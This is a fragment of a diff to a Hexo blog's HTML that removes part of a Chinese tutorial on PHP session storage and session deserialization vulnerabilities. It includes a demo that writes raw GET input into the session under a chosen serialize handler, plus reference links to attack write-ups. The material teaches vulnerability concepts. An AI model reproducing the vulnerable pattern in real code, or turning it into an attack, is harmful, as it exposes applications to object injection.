class="line">var_dump(session_name());</span><br><span class="line"><span class="comment">//session的销毁</span></span><br><span class="line">session_destroy();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="session存储方式"><a href="#session存储方式" class="headerlink" title="session存储方式"></a>session存储方式</h4><p>PHP中的session中的文件内容默认是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDICPDEDEDACOHAGOGH"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以如下代码为例，查看不同存储引擎存储的结果</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);<span class="comment">//这里换不同的存储引擎</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;username&#x27;</span>] = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDJCPDEDEDBCOHAGOGH"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDFDADACPDEDEDCCOHAGOGH"></p>
-<h4 id="有-SESSION赋值的反序列化"><a href="#有-SESSION赋值的反序列化" class="headerlink" title="有$_SESSION赋值的反序列化"></a>有$_SESSION赋值的反序列化</h4><p>当网站序列化存储 <code>session</code> 与反序列化读取 <code>session</code> 的方式不同时，就可能导致 <code>session</code> 反序列化漏洞的产生。 一般都是以 <code>php_serialize</code> 序列化存储 <code>session</code>， 以 <code>PHP</code> 反序列化读取 <code>session</code>，造成反序列化攻击。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDFDADBCPDEDFDECOHAGOGH"></p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PHP session 常见利用点 - 先知社区  https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;8221#toc-5</span><br><span class="line"></span><br><span class="line">反序列化 | Welcome eeknight.top  http:&#x2F;&#x2F;eeknight.top&#x2F;2020&#x2F;10&#x2F;03&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97&#x2F;</span><br><span class="line"></span><br><span class="line">反序列化 | shasha  https:&#x2F;&#x2F;zzdooo.gitee.io&#x2F;sddoo&#x2F;2020&#x2F;10&#x2F;02&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&#x2F;</span><br><span class="line"></span><br><span class="line">初探phar:&#x2F;&#x2F; - 先知社区  https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2715</span><br><span class="line"></span><br><span class="line">原理+实践掌握(PHP反序列化和Session反序列化) - 先知社区  https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7366#toc-4</span><br><span class="line"></span><br><span class="line">Phar反序列化拓展攻击学习笔记 | Xiao Leung&#39;s Blog  http:&#x2F;&#x2F;www.plasf.cn&#x2F;2019&#x2F;12&#x2F;12&#x2F;Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB&#x2F;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1990,7 +1978,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2037,12 +2025,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">75k</span>
+    <span title="站点总字数">81k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:08</span>
+    <span title="站点阅读时长">1:14</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
   </div>
